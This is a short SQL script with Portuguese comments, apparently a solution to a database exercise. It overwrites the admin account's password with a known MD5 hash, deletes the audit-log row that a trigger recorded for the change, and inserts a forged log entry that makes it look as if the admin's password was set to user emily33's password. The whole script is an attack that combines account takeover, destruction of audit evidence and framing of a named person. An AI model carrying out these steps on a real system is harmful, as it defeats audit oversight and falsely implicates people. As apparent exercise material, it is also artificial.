-- 1. Altera a senha do admin para o hash MD5 de 'oops!'
--    (o trigger "log_user_updates" registra a mudança em "user_logs")
UPDATE "users"
SET "password" = '982c0381c279d139fd221fce974916e7'
WHERE "username" = 'admin';

-- 2. Apaga o registro que o trigger acabou de criar, sem depender de um id fixo
DELETE FROM "user_logs"
WHERE "type" = 'update'
AND "old_username" = 'admin'
AND "new_password" = '982c0381c279d139fd221fce974916e7';

-- 3. Planta um log falso: parece que a senha do admin virou a de emily33
INSERT INTO "user_logs" ("type", "old_username", "new_username", "old_password", "new_password")
SELECT
    'update',
    'admin',
    'admin',
    'e10adc3949ba59abbe56e057f20f883e',
    "password"
FROM "users"
WHERE "username" = 'emily33';
